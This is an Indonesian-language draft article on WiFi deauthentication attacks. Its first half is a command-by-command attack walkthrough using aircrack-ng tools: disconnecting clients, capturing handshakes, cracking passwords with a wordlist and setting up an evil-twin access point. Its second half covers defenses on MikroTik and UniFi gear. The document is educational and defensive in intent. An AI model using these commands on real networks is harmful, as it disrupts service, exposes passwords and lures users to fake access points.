---
draft: true
---

# Deauthentication Attack

## Pendahuluan
Deauthentication attack adalah serangan DoS pada WiFi dengan mengirim paket deauthentication palsu, memutus koneksi perangkat dari jaringan.

## Cara Kerja
Serangan ini memanfaatkan celah protokol IEEE 802.11, di mana penyerang mengirimkan paket deauthentication agar perangkat target terputus dari jaringan.

### 1. Mengaktifkan Monitor Mode
```bash
airmon-ng start wlan0  # Aktifkan monitor mode
```

### 2. Mencari Target
```bash
airodump-ng wlan0mon  # Scan jaringan
```

### 3. Menjalankan Serangan Deauthentication
```bash
aireplay-ng -0 0 -a [BSSID] -c [CLIENT] wlan0mon  # Target spesifik
aireplay-ng -0 0 -a [BSSID] wlan0mon  # Semua klien
```

### 4. Crack Password (Opsional)
```bash
airodump-ng -d [BSSID] -c [CH] -w [path] wlan0mon
aircrack-ng -w /usr/share/wordlists/rockyou.txt [file.cap]
```

### 5. Membuat AP Palsu (Evil Twin)
```bash
airbase-ng -e "Free WiFi" -c 6 wlan0mon
```

Serangan ini hanya untuk tujuan edukasi dan pengujian keamanan jaringan.

# Prevention Deauthentication

Serangan deauthentication (deauth) adalah jenis serangan yang mengeksploitasi protokol manajemen Wi-Fi untuk memutuskan koneksi pengguna dengan mengirimkan paket deauthentication palsu. Untuk mencegah serangan ini, berikut adalah beberapa metode yang dapat diterapkan:

## 1. Mengaktifkan Protected Management Frames (PMF)
PMF adalah fitur keamanan yang melindungi frame manajemen dari serangan seperti deauth. 

- **MikroTik:**
  ```bash
  /interface wireless security-profiles set [find default=yes] management-protection=required
  ```
  *Pastikan perangkat klien mendukung PMF agar tetap dapat terhubung.*

- **Ubiquiti UniFi:**
  - Buka **UniFi Controller** → **Settings** → **Wireless Networks** → Pilih SSID yang ingin diamankan.
  - Di bagian **Advanced Options**, atur **PMF** ke `Optional` atau `Required`.

## 2. Menggunakan WPA3 atau WPA2-Enterprise
WPA3 memiliki proteksi tambahan terhadap serangan deauth.

- **MikroTik:**
  ```bash
  /interface wireless security-profiles set [find default=yes] authentication-types=wpa2-eap,wpa3-eap
  ```
  *Jika perangkat tidak mendukung WPA3, gunakan mode transisi dengan WPA2.*

- **UniFi:**
  - Masuk ke **UniFi Controller** → **Settings** → **Wireless Networks**.
  - Pilih **WPA3** atau **WPA2/WPA3 Transition Mode** untuk kompatibilitas perangkat lama.

## 3. Menonaktifkan Penyiaran SSID dan Menggunakan Pemfilteran MAC

Menonaktifkan SSID membuat jaringan tidak terlihat oleh perangkat biasa, meskipun masih bisa dideteksi oleh peretas berpengalaman.

- **MikroTik:**
  ```bash
  /interface wireless set [find default-name=wlan1] hide-ssid=yes
  ```
- **UniFi:**
  - Masuk ke **UniFi Controller** → **Settings** → **Wireless Networks**.
  - Centang **Hide SSID** untuk menyembunyikan SSID dari pemindaian.

Pemfilteran MAC dapat digunakan untuk membatasi perangkat yang dapat terhubung.

## 4. Menggunakan Dual-Band dan Load Balancing

Menggunakan SSID terpisah untuk 2.4 GHz dan 5 GHz dapat mengurangi dampak serangan jika salah satu jaringan mengalami deauth.

- **MikroTik:**
  ```bash
  /interface wireless set [find default-name=wlan1] frequency=2.4GHz ssid=SSID_2.4GHz
  /interface wireless set [find default-name=wlan2] frequency=5GHz ssid=SSID_5GHz
  ```

- **UniFi:**
  - Buat dua SSID terpisah untuk 2.4 GHz dan 5 GHz di **UniFi Controller**.
  - Aktifkan **Band Steering** untuk membantu perangkat memilih frekuensi terbaik.

## 5. Menggunakan IDS/IPS untuk Mendeteksi dan Memblokir Serangan
Sistem Intrusion Detection System (IDS) dan Intrusion Prevention System (IPS) dapat mendeteksi dan mencegah serangan deauth.

- **UniFi:**
  - Aktifkan **Threat Management** di **Settings** → **Firewall & Security**.

- **MikroTik:**
  - Gunakan fitur Wireless Intrusion Detection System (WIDS) untuk memonitor aktivitas mencurigakan.

## 6. Membatasi Jangkauan Sinyal dan Menggunakan AP dengan Anti-Jamming
Mengurangi daya pancar sinyal WiFi dapat mengurangi kemungkinan jaringan terdeteksi oleh penyerang.

- **MikroTik:**
  ```bash
  /interface wireless set [find default-name=wlan1] tx-power=15
  ```
- **UniFi:**
  - Masuk ke **UniFi Controller** → **Devices** → Pilih AP → **Config** → **Radio** → Atur **Transmit Power**.

## 7. Monitoring dan Logging Aktivitas Jaringan
Memonitor log jaringan dapat membantu mendeteksi percobaan serangan deauth.

- **MikroTik:**
  ```bash
  /system logging add topics=wireless action=memory
  ```

- **UniFi:**
  - Gunakan fitur **Insights** dan **Logs** di **UniFi Controller** untuk memantau anomali jaringan.

---

Dengan menerapkan metode di atas, risiko serangan deauth dapat diminimalisir secara signifikan, menjaga koneksi Wi-Fi tetap stabil dan aman dari gangguan pihak luar.

### Sumber:
Artikel ini disusun berdasarkan referensi dari:

- [SudoRealm - Deauthentication Attack using Kali Linux](https://sudorealm.com/blog/deauthentication-attack-using-kali-linux)
- [Aircrack-ng - Newbie Guide](https://www.aircrack-ng.org/doku.php?id=newbie_guide)
- [InkyVoxel - How to Enable Monitor Mode](https://www.inkyvoxel.com/how-to-enable-monitor-mode)